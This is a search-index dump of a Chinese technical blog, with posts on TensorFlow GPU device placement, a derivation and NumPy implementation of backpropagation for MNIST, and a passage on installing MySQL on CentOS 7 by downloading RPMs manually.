\u6307\u5b9a\u8bbe\u5907\uff0c\u4ee5\u53ca\u901a\u8fc7\u8bbe\u7f6e CUDA_VISIBLE_DEVICES \u73af\u5883\u53d8\u91cf\u4f18\u5316\u663e\u5b58\u4f7f\u7528\u3002\u5728\u591a\u673a\u6a21\u5f0f\u4e2d\uff0c\u5206\u6790\u4e86 In-graph \u548c Between-graph \u4e24\u79cd\u5206\u5e03\u5f0f\u8bad\u7ec3\u6a21\u5f0f\u7684\u7279\u70b9\u53ca\u5e94\u7528\u573a\u666f\u3002</p>"},{"location":"blog/2018/12/23/distributed-tensorflow/#\u5355\u673a","title":"\u5355\u673a","text":""},{"location":"blog/2018/12/23/distributed-tensorflow/#log_device_placement","title":"log_device_placement","text":"<p>\u5355\u673a\u60c5\u51b5\u6bd4\u8f83\u7b80\u5355\uff0c\u4e0d\u9700\u8981\u7279\u6b8a\u914d\u7f6e\uff0cTensorFlow \u4f1a\u81ea\u52a8\u5c06\u8ba1\u7b97\u4efb\u52a1\u5206\u914d\u5230\u53ef\u7528\u7684 GPU \u4e0a\uff0c\u5728\u5b9a\u4e49 session \u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7log_device_placement\u53c2\u6570\u6765\u6253\u5370\u5177\u4f53\u7684\u8ba1\u7b97\u4efb\u52a1\u5206\u914d\uff1a</p> <pre><code>import tensorflow as tf\n\na = tf.constant([1.0, 2.0, 3.0], shape=[3], name='a')\nb = tf.constant([1.0, 2.0, 3.0], shape=[3], name='b')\nc = a + b\n\nwith tf.Session(config = tf.ConfigProto(log_device_placement = True)) as sess:\n    sess.run(tf.global_variables_initializer())\n    print(sess.run(c))\n</code></pre> <p></p>"},{"location":"blog/2018/12/23/distributed-tensorflow/#\u6307\u5b9a\u8bbe\u5907","title":"\u6307\u5b9a\u8bbe\u5907","text":"<p>\u5982\u679c\u9700\u8981\u8ba9\u4e00\u4e9b\u8fd0\u7b97\u5728\u7279\u5b9a\u7684\u8bbe\u5907\u4e0a\u6267\u884c\uff0c\u53ef\u4ee5\u4f7f\u7528 tf.device:</p> <pre><code>import tensorflow as tf\n\nwith tf.device('/cpu:0'):\n a = tf.constant([1.0, 2.0, 3.0], shape=[3], name='a')\n b = tf.constant([1.0, 2.0, 3.0], shape=[3], name='b')\nwith tf.device('/gpu:0'):\n c = a + b\n\nwith tf.Session(config = tf.ConfigProto(log_device_placement = True)) as sess:\n    sess.run(tf.global_variables_initializer())\n    print(sess.run(c))\n</code></pre> <p></p>"},{"location":"blog/2018/12/23/distributed-tensorflow/#\u73af\u5883\u53d8\u91cf","title":"\u73af\u5883\u53d8\u91cf","text":"<p>\u5c3d\u7ba1\u4e0a\u9762\u4e00\u4e2a\u4f8b\u5b50\u4e2d\u6211\u4eec\u53ea\u7ed9 CPU \u548c GPU0 \u6307\u5b9a\u4e86\u8ba1\u7b97\u4efb\u52a1\uff0c\u4f46\u662f\u4e24\u5757\u663e\u5361\u7684\u663e\u5b58\u90fd\u88ab\u5360\u6ee1\u4e86\uff1a</p> <p></p> <p>\u56e0\u4e3a TensorFlow \u4f1a\u9ed8\u8ba4\u5360\u6ee1\u6240\u6709\u53ef\u89c1 GPU \u7684\u663e\u5b58\uff0c\u5bf9\u4e8e\u7b80\u5355\u7684\u8ba1\u7b97\u4efb\u52a1\uff0c\u8fd9\u6837\u663e\u7136\u975e\u5e38\u6d6a\u8d39\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u73af\u5883\u53d8\u91cfCUDA_VISIBLE_DEVICES\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff1a</p> <pre><code># \u8fd0\u884c\u65f6\u6307\u5b9a\u73af\u5883\u53d8\u91cf\nCUDA_VISIBLE_DEVICES=0 python demo.py\n</code></pre> <pre><code># Python \u4ee3\u7801\u4e2d\u4fee\u6539\u73af\u5883\u53d8\u91cf\nimport os\nos.environ['CUDA_VISIBLE_DEVICES']='0'\n...\n</code></pre>"},{"location":"blog/2018/12/23/distributed-tensorflow/#\u591a\u673a","title":"\u591a\u673a","text":""},{"location":"blog/2018/12/23/distributed-tensorflow/#in-graph--between-graph","title":"In-graph &amp; Between-graph","text":"<p>TensorFlow \u7684\u5206\u5e03\u5f0f\u8bad\u7ec3\u6709\u4e24\u79cd\u6a21\u5f0f\uff1aIn-graph \u548c Between-graph</p> <p>In-graph: \u4e0d\u540c\u7684\u673a\u5668\u6267\u884c\u8ba1\u7b97\u56fe\u7684\u4e0d\u540c\u90e8\u5206\uff0c\u548c\u5355\u673a\u591a GPU \u6a21\u5f0f\u7c7b\u4f3c\uff0c\u4e00\u4e2a\u8282\u70b9\u8d1f\u8d23\u6a21\u578b\u6570\u636e\u5206\u53d1\uff0c\u5176\u4ed6\u8282\u70b9\u7b49\u5f85\u63a5\u53d7\u4efb\u52a1\uff0c\u901a\u8fc7tf.device(\"/job:worker/task:n\")\u6765\u6307\u5b9a\u8ba1\u7b97\u8fd0\u884c\u7684\u8282\u70b9</p> <p></p> <p>Between-graph:\u6bcf\u53f0\u673a\u5668\u6267\u884c\u76f8\u540c\u7684\u8ba1\u7b97\u56fe</p>"},{"location":"blog/2018/12/24/bp-%E7%AE%97%E6%B3%95feed-forward-neural-network-and-back-propagation/","title":"\uff08BP \u7b97\u6cd5\uff09Feed forward neural network and back propagation","text":"<p>AI Generated Abstract</p> <p>\u672c\u6587\u4ecb\u7ecd\u4e86 BP \u7b97\u6cd5\uff08\u53cd\u5411\u4f20\u64ad\u7b97\u6cd5\uff09\u7684\u57fa\u672c\u539f\u7406\u53ca\u5176\u5728\u795e\u7ecf\u7f51\u7edc\u4e2d\u7684\u5e94\u7528\u3002\u5185\u5bb9\u5305\u62ec\u795e\u7ecf\u5143\u7ed3\u6784\u3001\u7f51\u7edc\u7ed3\u6784\u3001\u635f\u5931\u51fd\u6570\u7684\u5b9a\u4e49\u4e0e\u8ba1\u7b97\uff0c\u4ee5\u53ca BP \u7b97\u6cd5\u7684\u6570\u5b66\u63a8\u5bfc\u548c\u5b9e\u73b0\u8fc7\u7a0b\u3002\u6700\u540e\uff0c\u901a\u8fc7\u4e00\u4e2a\u7b80\u5355\u7684 3 \u9690\u5c42\u795e\u7ecf\u7f51\u7edc\u5b9e\u73b0\uff0c\u5c55\u793a\u4e86 BP \u7b97\u6cd5\u5728\u624b\u5199\u6570\u5b57\u5206\u7c7b\u4efb\u52a1\u4e2d\u7684\u5b9e\u9645\u5e94\u7528\u3002</p>"},{"location":"blog/2018/12/24/bp-%E7%AE%97%E6%B3%95feed-forward-neural-network-and-back-propagation/#neuron-structure","title":"Neuron structure","text":"<p>\u4e0a\u56fe\u662f\u4e00\u79cd\u5178\u578b\u7684\u795e\u7ecf\u5143\u7ed3\u6784\uff0c\\(x_n\\)\u662f\u795e\u7ecf\u5143\u7684\u8f93\u5165\uff0c\u5c06\u8f93\u5165\u52a0\u6743\u6c42\u548c\u540e\u518d\u901a\u8fc7\u6fc0\u6d3b\u51fd\u6570\u5373\u53ef\u5f97\u5230\u6b64\u795e\u7ecf\u5143\u7684\u8f93\u51fa\uff1a</p> \\[t = \\sum_{i=1}^{n}{w_ix_i} + b\\] \\[a = f(t)\\] <p>\u4e3a\u8ba1\u7b97\u65b9\u4fbf\uff0c\u53ef\u5c06\u504f\u7f6e\\(b\\)\u63d0\u5230\u6c42\u548c\u7b26\u53f7\u91cc\u9762\uff0c\u76f8\u5f53\u4e8e\u52a0\u5165\u4e00\u4e2a\u6052\u4e3a 1 \u7684\u8f93\u5165\u503c\uff0c\u5bf9\u5e94\u7684\u6743\u91cd\u4e3a\\(b\\)\uff1a</p> \\[t = \\sum_{i=0}^{n}{w_ix_i},(x_0 = 1, w_0 = b)\\] \\[a = f(t)\\] <p>\u6b64\u5373\u4e3a\u4e0a\u56fe\u795e\u7ecf\u5143\u7ed3\u6784\u5bf9\u5e94\u7684\u8868\u8fbe\u5f0f</p> <p>\u5e38\u7528\u7684\u6fc0\u6d3b\u51fd\u6570\u6709 sigmoid, ReLU, tanh \u7b49\u3002</p>"},{"location":"blog/2018/12/24/bp-%E7%AE%97%E6%B3%95feed-forward-neural-network-and-back-propagation/#network-structure","title":"Network structure","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u7b80\u5355\u7684 3 \u5c42\u7f51\u7edc\uff0c\u8f93\u5165\u5c42\u6709 3 \u4e2a\u8f93\u5165\u503c\uff0c\u9690\u85cf\u5c42\u5305\u542b 3 \u4e2a\u9690\u85cf\u795e\u7ecf\u5143\uff0c\u6700\u540e\u662f\u4e24\u4e2a\u8f93\u51fa\u503c</p> <p>\u9690\u85cf\u5c42\u795e\u7ecf\u5143\u7684\u524d\u5411\u8ba1\u7b97\u8fc7\u7a0b\uff1a</p> \\[z_i^{l} = \\sum_{i=0}^{n}w_{ij}^{l}x_j, (x_0 = 1, w_0 = b)\\] \\[a_i^l = f(z_i^l)\\] <p>\\(l\\)\u8868\u793a\u7b2c\u51e0\u5c42\u3002</p> <p>\u8fd9\u4e2a\u7f51\u7edc\u7684\u62bd\u8c61\u6570\u5b66\u8868\u8fbe\u5f0f\u4e3a\uff1a</p> \\[F(x) = f_3(f_2(x * W_2 + b_2) * W_3 + b_3)\\] <p>\u4e8b\u5b9e\u4e0a\uff0c\u6df1\u5ea6\u795e\u7ecf\u7f51\u7edc\u4e00\u822c\u90fd\u80fd\u591f\u62bd\u8c61\u4e3a\u4e00\u4e2a\u590d\u5408\u7684\u975e\u7ebf\u6027\u591a\u5143\u51fd\u6570\uff0c\u6709\u591a\u5c11\u9690\u85cf\u5c42\u5c31\u6709\u591a\u5c11\u5c42\u590d\u5408\u51fd\u6570\uff1a</p> \\[F(x) = f_n\\left(\\dots f_3(f_2(f_1(x) * w_1 + b_1) * w_2 + b_2)\\dots\\right)\\]"},{"location":"blog/2018/12/24/bp-%E7%AE%97%E6%B3%95feed-forward-neural-network-and-back-propagation/#loss","title":"Loss","text":"<p>Loss\uff0c\u5373\u635f\u5931\uff0c\u7528\u6765\u8861\u91cf\u795e\u7ecf\u7f51\u7edc\u7684\u8f93\u51fa\u503c\u4e0e\u5b9e\u9645\u503c\u7684\u8bef\u5dee\uff0c\u5bf9\u4e8e\u4e0d\u540c\u7684\u95ee\u9898\uff0c\u901a\u5e38\u4f1a\u5b9a\u4e49\u4e0d\u540c\u7684 loss \u51fd\u6570</p> <p>\u56de\u5f52\u95ee\u9898\u5e38\u7528\u7684\u5747\u65b9\u8bef\u5dee\uff1a</p> \\[MSE = \\frac{1}{n}\\sum_{i=1}^{n}(Y - f(x))^2\\] <p>\\(Y\\)\u4e3a\u5b9e\u9645\u503c\uff0c\\(f(x)\\)\u4e3a\u7f51\u7edc\u9884\u6d4b\u503c</p> <p>\u5206\u7c7b\u95ee\u9898\u5e38\u7528\u7684\u4ea4\u53c9\u71b5 (m \u7c7b)\uff1a</p> \\[L = \\sum_{k=1}^{n}\\sum_{i=1}^{m}l_{ki}log(p_{ki})\\] <p>\\(l_{ki}\\)\u8868\u793a\u7b2c k \u4e2a\u6837\u672c\u5b9e\u9645\u662f\u5426\u5c5e\u4e8e\u7b2c i \u7c7b\uff080\uff0c1 \u7f16\u7801\uff09\uff0c\\(p_{ki}\\)\u8868\u793a\u7b2c k \u4e2a\u6837\u672c\u5c5e\u4e8e\u7b2c i \u7c7b\u7684\u6982\u7387\u503c</p> <p>\u7279\u522b\u5730\uff0c\u4e8c\u5206\u7c7b\u95ee\u9898\u7684\u4ea4\u53c9\u71b5\u635f\u5931\u51fd\u6570\u5f62\u5f0f\u4e3a\uff1a</p> \\[L = \\sum_{i=1}^{n}[y_ilog(p_i) + (1 - y_i)log(1 - p_i)]\\] <p>\\(y_i\\)\u4e3a\u7b2c i \u4e2a\u6837\u672c\u6240\u5c5e\u7c7b\u522b\uff0c\\(p_i\\)\u4e3a\u7b2c i \u4e2a\u6837\u672c\u5c5e\u4e8e\\(y_i\\)\u7c7b\u7684\u6982\u7387</p>"},{"location":"blog/2018/12/24/bp-%E7%AE%97%E6%B3%95feed-forward-neural-network-and-back-propagation/#back-propagation","title":"Back propagation","text":"<p>BP \u662f\u7528\u6765\u5c06 loss \u53cd\u5411\u4f20\u64ad\u7684\u7b97\u6cd5\uff0c\u7528\u6765\u8c03\u6574\u7f51\u7edc\u4e2d\u795e\u7ecf\u5143\u95f4\u8fde\u63a5\u7684\u6743\u91cd\u548c\u504f\u7f6e\uff0c\u6574\u4e2a\u8bad\u7ec3\u7684\u8fc7\u7a0b\u5c31\u662f\uff1a\u524d\u5411\u8ba1\u7b97\u7f51\u7edc\u8f93\u51fa -&gt;;\u6839\u636e\u5f53\u524d\u7f51\u7edc\u8f93\u51fa\u8ba1\u7b97 loss-&gt;BP \u7b97\u6cd5\u53cd\u5411\u4f20\u64ad loss \u8c03\u6574\u7f51\u7edc\u53c2\u6570\uff0c\u4e0d\u65ad\u5faa\u73af\u8fd9\u6837\u7684\u4e09\u6b65\u76f4\u5230 loss \u8fbe\u5230\u6700\u5c0f\u6216\u8fbe\u5230\u6307\u5b9a\u505c\u6b62\u6761\u4ef6</p> <p>BP \u7b97\u6cd5\u7684\u672c\u8d28\u662f\u6c42\u5bfc\u7684\u94fe\u5f0f\u6cd5\u5219\uff0c\u5bf9\u4e8e\u4e0a\u9762\u7684\u4e09\u5c42\u7f51\u7edc\uff0c\u5047\u8bbe\u5176\u635f\u5931\u51fd\u6570\u4e3a\\(C\\)\uff0c\u6fc0\u6d3b\u51fd\u6570\u4e3a\\(\\sigma\\)\uff0c\u7b2c\\(l\\)\u7b2c\\(i\\)\u4e2a\u795e\u7ecf\u5143\u7684\u8f93\u5165\u4e3a\\(z_i^{(l)}\\)\uff0c\u8f93\u51fa\u4e3a\\(a_i^{(l)}\\)</p> <p>\u5219\u901a\u8fc7\u68af\u5ea6\u4e0b\u964d\u6765\u66f4\u65b0\u6743\u503c\u548c\u504f\u7f6e\u7684\u516c\u5f0f\u5982\u4e0b\uff1a</p> \\[W_{ij}^{(l)} = W_{ij}^{(l)} - \\eta\\frac{\\partial}{\\partial W_{ij}^{(l)}}C\\tag1\\] \\[b_{i}^{(l)} = b_{i}^{(l)} - \\eta\\frac{\\partial}{\\partial b_{i}^{(l)}}C\\tag2\\] <p>\\(W_{ij}^{(l)}\\)\u8868\u793a\u7b2c\\(l\\)\u5c42\u7b2c\\(i\\)\u4e2a\u795e\u7ecf\u5143\u4e0e\u7b2c\\(l - 1\\)\u5c42\u7b2c\\(j\\)\u4e2a\u795e\u7ecf\u5143\u8fde\u63a5\u7684\u6743\u503c\uff0c\\(b_i^{(l)}\\)\u8868\u793a\u7b2c\\(l\\)\u5c42\u7b2c\\(i\\)\u4e2a\u795e\u7ecf\u5143\u7684\u504f\u7f6e</p> <p>\\(\\eta\\)\u8868\u793a\u5b66\u4e60\u7387</p> <p>\u7531\u66f4\u65b0\u516c\u5f0f\u53ef\u89c1\u4e3b\u8981\u95ee\u9898\u5728\u4e8e\u6c42\u89e3\u635f\u5931\u51fd\u6570\u5173\u4e8e\u6743\u503c\u548c\u504f\u7f6e\u7684\u504f\u5bfc\u6570</p> <p>\u7b2c\\(l\\)\u5c42\u7b2c\\(i\\)\u4e2a\u795e\u7ecf\u5143\u7684\u8f93\u5165\\(z_i^{(l)}\\)\u4e3a\uff1a</p> \\[z_i^{(l)} = \\sum_{j=1}^{n^{(l-1)}}{W_{ij}^{(l)}a_j^{(l-1)}} + b_i^{l}\\tag3\\] <p>\u5219\u66f4\u65b0\u516c\u5f0f\u4e2d\u504f\u5bfc\u9879\u53ef\u5316\u4e3a\uff1a</p> \\[\\frac{\\partial}{\\partial W_{ij}^{(l)}}C = \\frac{\\partial C}{\\partial z_i^{(l)}} \\bullet \\frac{\\partial z_i^{(l)}}{\\partial W_{ij}^{(l)}} = \\frac{\\partial C}{\\partial z_i^{(l)}} \\bullet a_i^{(l-1)}\\tag4\\] \\[\\frac{\\partial}{\\partial b_{i}^{(l)}}C = \\frac{\\partial C}{\\partial z_i^{(l)}} \\bullet \\frac{\\partial z_i^{(l)}}{\\partial b_{i}^{(l)}} = \\frac{\\partial C}{\\partial z_i^{(l)}}\\tag5\\] <p>\u5b9a\u4e49</p> \\[\\delta_i^{(l)} = \\frac{\\partial}{\\partial z_i^{(l)}}C\\tag6\\] <p>\u73b0\u5728\u95ee\u9898\u8f6c\u5316\u4e3a\u6c42\u89e3\\(\\delta_i^{(l)}\\)\uff0c\u5bf9\u7b2c\\(l\\)\u5c42\u7b2c\\(j\\)\u4e2a\u795e\u7ecf\u5143\u6709\uff1a</p> \\[ \\delta_j^{(l)} = \\frac{\\partial C}{\\partial z_j^{(l)}} = \\sum_{i=1}^{n^{(l+1)}}\\frac{\\partial C}{\\partial z_i^{(l+1)}} \\bullet \\frac{\\partial z_i^{(l+1)}}{\\partial a_j^{(l)}} \\bullet \\frac{\\partial a_j^{(l)}}{\\partial z_j^{(l)}} \\\\ =\\sum_{i=1}^{n^{(l+1)}}\\delta_i^{(l+1)} \\bullet \\frac{\\partial(W_{ij}^{l+1} + b_i^{(l+1)})}{\\partial a_j^{(l)}} \\bullet \\sigma^\\prime(z_j^{(l)})\\\\ =\\sum_{i=1}^{n^{(l+1)}}\\delta_i^{(l+1)} \\bullet W_{ij}^{(l+1)} \\bullet \\sigma^\\prime(z_j^{(l)})\\tag7 \\] <p>\u5219\uff1a</p> \\[\\delta^{(l)} = ((W^{(l+1)})^T\\delta^{(l+1)})\\odot\\sigma^\\prime(z^{(l)})\\tag8\\] <p>\u635f\u5931\u51fd\u6570\u5173\u4e8e\u6743\u91cd\u548c\u504f\u7f6e\u7684\u504f\u5bfc\u5206\u522b\u4e3a\uff1a</p> \\[\\frac{\\partial C}{\\partial W_{ij}^{(l)}} = a_i^{(l-1)}\\delta_i^{(l)}\\tag9\\] \\[\\frac{\\partial C}{\\partial b_{i}^{(l)}} =\\delta_i^{(l)}\\tag{10}\\] <p>\u8bef\u5dee\u6839\u636e 8 \u5f0f\u7531\u8f93\u51fa\u5c42\u5411\u540e\u4f20\u64ad\uff0c\u518d\u7ed3\u5408 1\uff0c2\uff0c9\uff0c10 \u56db\u5f0f\u5bf9\u6743\u91cd\u548c\u504f\u7f6e\u8fdb\u884c\u66f4\u65b0</p>"},{"location":"blog/2018/12/24/bp-%E7%AE%97%E6%B3%95feed-forward-neural-network-and-back-propagation/#\u5b9e\u73b0","title":"\u5b9e\u73b0","text":"<p>\u4e0b\u9762\u662f\u4e00\u4e2a\u7b80\u5355 3 \u9690\u5c42\u795e\u7ecf\u7f51\u7edc\u7684\u5b9e\u73b0</p> <pre><code>import numpy as np\n\ndef loss(pred, y):\n    return np.sum((pred - y) ** 2)\n\ndef loss_prime(pred, y):\n    return pred - y\n\nclass network:\n\n    def __init__(self, input_size, hidden_size, num_layers, output_size, loss = loss, loss_prime = loss_prime):\n        self.input_size = input_size\n        self.hidden_size = hidden_size\n        self.num_layers = num_layers\n        self.output_size = output_size\n\n        # activation function\n        self.activation = self.sigmoid\n        # derivative of activation function\n        self.activation_prime = self.sigmoid_prime\n        # loss funciton\n        self.loss = loss\n        # derivative of loss function\n        self.loss_prime = loss_prime\n\n        # input-&gt;hidden\n        self.w_ih = np.random.randn(input_size, hidden_size)\n        self.b_ih = np.random.randn(1, hidden_size)\n\n        # hidden layers\n        self.W_hh = [np.random.randn(hidden_size, hidden_size) for _ in range(num_layers - 1)]\n        self.B_hh = [np.random.randn(1, hidden_size) for _ in range(num_layers - 1)]\n\n        # hidden-&gt;output\n        self.w_ho = np.random.randn(hidden_size, output_size)\n        self.b_ho = np.random.randn(1, output_size)\n\n        # assemble w and b\n        self.W = [self.w_ih]\n        self.W.extend(self.W_hh)\n        self.W.append(self.w_ho)\n\n        self.B = [self.b_ih]\n        self.B.extend(self.B_hh)\n        self.B.append(self.b_ho)\n\n    # activation\n    def sigmoid(self, x):\n        return 1.0 / (1 + np.exp(-x))\n\n    def sigmoid_prime(self, x):\n        return self.sigmoid(x) * (1 - self.sigmoid(x))\n\n    # forward pass, calculate the output of the network\n    def forward(self, a):\n        for w, b in zip(self.W, self.B):\n            a = self.activation(np.dot(a, w) + b)\n        return a\n\n    # backpropagate error\n    def backward(self, x, y):\n        delta_w = [np.zeros(w.shape) for w in self.W]\n        delta_b = [np.zeros(b.shape) for b in self.B]\n\n        # get output of each layer in forward pass\n        out = x\n        outs = []\n        zs = []\n        for w, b in zip(self.W, self.B):\n            z = np.dot(out, w) + b\n            zs.append(z)\n            out = self.activation(z)\n            outs.append(out)\n\n        # \u03b4 of last layer\n        delta = self.loss_prime(outs[-1], y) * self.activation_prime(zs[-1])\n\n        delta_b[-1] = delta\n        delta_w[-1] = np.dot(outs[-2].transpose(), delta)\n\n        for i in range(2, len(delta_w)):\n            delta = np.dot(delta, self.W[-i+1].transpose()) * self.activation_prime(zs[-i])\n            delta_b[-i] = delta\n            delta_w[-i] = np.dot(outs[-i-1].transpose(), delta)\n\n        return delta_w, delta_b\n\n    # update w and b\n    def update(self, batch, lr):\n        delta_w = [np.zeros(w.shape) for w in self.W]\n        delta_b = [np.zeros(b.shape) for b in self.B]\n\n        for x, y in batch:\n            d_w, d_b = self.backward(x, y)\n            delta_w = [a + b for a, b in zip(delta_w, d_w)]\n            delta_b = [a + b for a, b in zip(delta_b, d_b)]\n\n        self.W = [w - lr * t for w, t in zip(self.W, delta_w)]\n        self.B = [b - lr * t for b, t in zip(self.B, delta_b)]\n\n    # SGD training\n    def train(self, train_data, epochs, batch_size, lr):\n        for i in range(epochs):\n            np.random.shuffle(train_data)\n            batches = [train_data[t : t + batch_size] for t in range(0, len(train_data), batch_size)]\n\n            for batch in batches:\n                self.update(batch, lr)\n\n            loss = 0\n            for x, y in train_data:\n                loss += self.loss(self.forward(x), y)\n            loss /= len(train_data)\n\n            print(\"Epoch %d done, loss: %f\" % (i + 1, loss))\n\n    # predict\n    def predict(self, x):\n        return self.forward(x)\n\n\n# use it for handwriting digits classification\nimport tensorflow as tf\nmnist = tf.keras.datasets.mnist\n\ndef onehot(y):\n    arr = np.zeros([y.shape[0], 10])\n    for i in range(y.shape[0]):\n        arr[i][y[i]] = 1\n    return arr\n\n(x_train, y_train),(x_test, y_test) = mnist.load_data()\nx_train, x_test = x_train / 255.0, x_test / 255.0\nx_train = x_train.reshape([-1, 28 * 28])\nx_test = x_test.reshape([-1, 28 * 28])\ny_train = onehot(y_train)\ny_test = onehot(y_test)\n\ntrain_data = [t for t in zip(x_train, y_train)]\ntest_data = [t for t in zip(x_test, y_test)]\n\ninput_size = 28 * 28\nhidden_size = 100\nnum_layers = 3\noutput_size = 10\n\nnet = network(input_size, hidden_size, num_layers, output_size)\n\nlr = 0.005\nepochs = 100\nbatch_size = 100\n\nnet.train(train_data, epochs, batch_size, lr)\n\ndef softmax(x):\n    exp = np.exp(x)\n    return exp / np.sum(exp)\n\ncorrect = 0\nfor x, y in test_data:\n    ret = net.forward(x)\n    pred = softmax(ret)\n    if np.argmax(pred) == np.argmax(y):\n        correct += 1\n\nacc = float(correct) / len(test_data)\nprint('test accuracy: ', acc)\n</code></pre>"},{"location":"blog/2019/03/31/%E5%A6%82%E4%BD%95%E5%9C%A8%E5%A2%99%E5%86%85%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2-centos-7-%E7%9A%84-mysql/","title":"\u5982\u4f55\u5728\u5899\u5185\u5feb\u901f\u90e8\u7f72 CentOS 7 \u7684 MySQL","text":"<p>MySQL \u88ab Oracle \u6536\u8d2d\u540e\uff0cCentOS \u7684\u955c\u50cf\u4ed3\u5e93\u4e2d\u63d0\u4f9b\u7684\u9ed8\u8ba4\u7684\u6570\u636e\u5e93\u4e5f\u53d8\u4e3a\u4e86 MariaDB\uff0c\u6240\u4ee5\u9ed8\u8ba4\u6ca1\u6709 MySQL\uff0c\u9700\u8981\u624b\u52a8\u5b89\u88c5\u3002</p> <p>\u5176\u5b9e\u5b89\u88c5 MySQL \u4e5f\u5e76\u4e0d\u662f\u4e00\u4ef6\u5f88\u96be\u7684\u4e8b\u60c5\uff0c\u4f46\u662f\u7531\u4e8e\u4e00\u4e9b\u5b9e\u9645\u5b58\u5728\u7684\u95ee\u9898 (\u6bd4\u5982\u67d0\u5899)\uff0c\u8ba9\u9ed8\u8ba4\u901a\u8fc7 yum \u5b89\u88c5 MySQL \u7684\u901f\u5ea6\u592a\u6162\u3002\u8fd9\u91cc\u63d0\u51fa\u4e00\u79cd\u53ef\u884c\u7684\u65b9\u6848\u6765\u5feb\u901f\u90e8\u7f72 MySQL\uff0c\u6b64\u65b9\u6848\u540c\u6837\u9002\u7528\u4e8e\u5176\u4ed6 rpm \u5305\u8f6f\u4ef6\u7684\u624b\u52a8\u5b89\u88c5\u3002</p> <p>\u672c\u6587\u5b9e\u9645\u5728\u8bb2\u7684\u662f\uff0c\u5982\u4f55\u5229\u7528\u5404\u79cd\u624b\u6bb5\uff0c\u52a0\u901f\u548c\u6539\u5584 yum \u7684\u5b89\u88c5\u8fc7\u7a0b\u3002</p>"},{"location":"blog/2019/03/31/%E5%A6%82%E4%BD%95%E5%9C%A8%E5%A2%99%E5%86%85%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2-centos-7-%E7%9A%84-mysql/#\u4f20\u7edf\u65b9\u6848\u6162\u5230\u6000\u7591\u4eba\u751f","title":"\u4f20\u7edf\u65b9\u6848\u2026\u2026\u6162\u5230\u6000\u7591\u4eba\u751f","text":"<p>\u6839\u636e\u5b98\u65b9\u6307\u5357\uff0c\u6211\u4eec\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff1a</p> <pre><code># \u4e0b\u8f7d\u6e90\nwget \"https://dev.mysql.com/get/mysql80-community-release-el7-2.noarch.rpm\"\n# \u5b89\u88c5\u6e90\nsudo rpm -ivh mysql80-community-release-el7-2.noarch.rpm\n# \u68c0\u67e5\u6e90\u662f\u5426\u6210\u529f\u5b89\u88c5\nsudo yum repolist enabled | grep \"mysql80-community*\"\n</code></pre> <p>\u63a5\u4e0b\u6765\u5c31\u662f\u6b63\u5e38\u7684\u5b89\u88c5\u6b65\u9aa4\uff1a</p> <pre><code>sudo yum install mysql-community-server mysql\n</code></pre> <p>\u4f46\u662f\u7531\u4e8e\u4e00\u4e9b\u539f\u56e0\uff0c\u4e0b\u8f7d\u901f\u5ea6\u57fa\u672c\u662f\u51e0 Byte/s\uff0cMySQL \u670d\u52a1\u5668\u7684\u5927\u5c0f (\u52a0\u4e0a\u4f9d\u8d56\u670d\u52a1) \u5dee\u4e0d\u591a\u6709 600MB\uff0c\u8fd9\u79cd\u65b9\u6cd5\u57fa\u672c\u4e0d\u53ef\u53d6\u3002\u624b\u5934\u6ca1\u6709\u7279\u522b\u597d\u7684\u800c\u4e14\u5f88\u65b0\u7684\u8f6f\u4ef6\u6e90\uff0c\u5c31\u6253\u7b97\u624b\u52a8\u5b89\u88c5\u3002</p>"},{"location":"blog/2019/03/31/%E5%A6%82%E4%BD%95%E5%9C%A8%E5%A2%99%E5%86%85%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2-centos-7-%E7%9A%84-mysql/#\u624b\u52a8\u5b89\u88c5\u6cd5","title":"\u624b\u52a8\u5b89\u88c5\u6cd5","text":"<p>\u9996\u5148\u4f9d\u7136\u9700\u8981\u4e0b\u8f7d\u5e76\u5b89\u88c5\u5b98\u65b9\u6e90\u3002</p> <pre><code>yum install mysql-community-server\n</code></pre> <p>\u5229\u7528\u8be5\u547d\u4ee4\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u4e00\u4e9b MySQl Server \u4ee5\u6765\u5b89\u88c5\u987a\u5e8f\u53ca\u5176\u7248\u672c\uff1a</p> <pre><code>=================================================================================================\n Package                       Arch          Version              Repository                Size\n=================================================================================================\nReinstalling:\n mysql-community-client        x86_64        8.0.15-1.el7         mysql80-community         25 M\n\n mysql-community-libs          x86_64        8.0.15-1.el7         mysql80-community          2 M\n\n mysql-community-common        x86_64        8.0.15-1.el7         mysql80-community        570 K\n\n mysql-community-server        x86_64        8.0.15-1.el7         mysql80-community        360 M\n\nTransaction Summary\n=================================================================================================\n</code></pre> <p>\u89e3\u538b\u5e76\u5206\u6790 rpm \u6e90\u5305\uff1a</p> <pre><code>rpm2cpio mysql80-community-release-el7-2.noarch.rpm | cpio -div\nvim /etc/yum.repos.d/mysql-community.repo\n</code></pre> <p>\u4ece\u4e2d\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u5bf9\u5e94\u7248\u672c\u7684\u7f51\u7edc\u8def\u5f84\u4e3a<code>http://repo.mysql.com/yum/mysql-8.0-community/el/7/x86_64/</code>\u3002</p> <p>\u6253\u5f00\u8be5\u5730\u5740\uff0c\u627e\u5230\u5bf9\u5e94\u7684\u51e0\u4e2a\u5b89\u88c5\u5305\uff1a</p> <ul> <li>mysql-community-client-8.0.15-1.el7.x86_64.rpm</li> <li>mysql-community-libs-8.0.15-1.el7.x86_64.rpm</li> <li>mysql-community-common-8.0.15-1.el7.x86_64.rpm</li> <li>mysql-community-server-8.0.15-1.el7.x86_64.rpm</li> </ul> <p>\u4f7f\u7528\u67d0\u79cd\u4e0b\u8f7d\u5de5\u5177 (\u6211\u4f7f\u7528\u7684\u662f\u8fc5\u96f7) \u4e0b\u8f7d\uff0c\u7136\u540e\u4f7f\u7528<code>scp</code>\u6307\u4ee4\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u4e0a\uff1a</p> <pre><code>scp mysql-community-client-8.0.15-1.el7.x86_64.rpm xxx@xx.xx.xx.xx:/root/mysql-community-client-8.0.15-1.el7.x86_64.rpm\nscp mysql-community-libs-8.0.15-1.el7.x86_64.rpm 